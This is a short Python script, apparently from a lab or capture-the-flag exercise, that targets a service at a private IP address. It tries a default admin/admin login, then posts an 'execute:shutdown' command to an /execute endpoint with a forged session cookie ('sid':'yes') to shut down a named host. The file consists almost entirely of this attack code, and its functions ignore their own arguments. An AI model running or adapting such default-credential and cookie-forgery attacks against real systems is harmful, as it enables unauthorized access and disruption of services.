import requests
BASE_URL = "http://10.247.71.196:6969"

def admin_login(username, password):
    login_r = requests.post(BASE_URL + "/login", params={"username":"admin", "password":"admin"})
    print (login_r.text)
def retrieve_cookie():
    login_g = requests.get(BASE_URL + "/login")
    print(login_g.text)
def send_command(command):
    send_exec = requests.post(BASE_URL + "/execute", params={"hostname":"66254.local", "execute":"execute:shutdown"}, cookies={"sid":"yes"})
    print(send_exec.text)
#retrieve_cookie()
# admin_login("admin","admin")

send_command("execute:shutdown")